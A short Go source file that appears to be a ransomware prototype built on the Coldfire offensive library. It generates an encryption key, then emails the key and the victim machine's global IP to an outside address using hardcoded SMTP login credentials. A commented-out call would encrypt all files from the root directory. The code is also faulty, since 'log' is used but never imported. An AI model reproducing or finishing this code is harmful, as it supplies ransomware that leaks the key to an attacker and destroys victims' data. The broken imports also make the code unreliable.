package main

import (
	"mail"
	"enc"

	"crypto/rand"

	"github.com/redcode-labs/Coldfire"
)

func main() {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		log.Println("Error generating random key:", err)
	}

	test := mail.SendEmail{Login: "funtoomen@disroot.org",
		Password: `haslomaslo`,
		Server: "disroot.org",
		Port: 587,

		To: []string{"mikolajl@danwin1210.de"},
		Subject: coldfire.GetGlobalIp(),
		Data: string(key[:])}
	test.Send()

//	err := enc.encryptFilesInDir("/", key)
//	if err != nil {
//		log.Println(err)
//	}
}
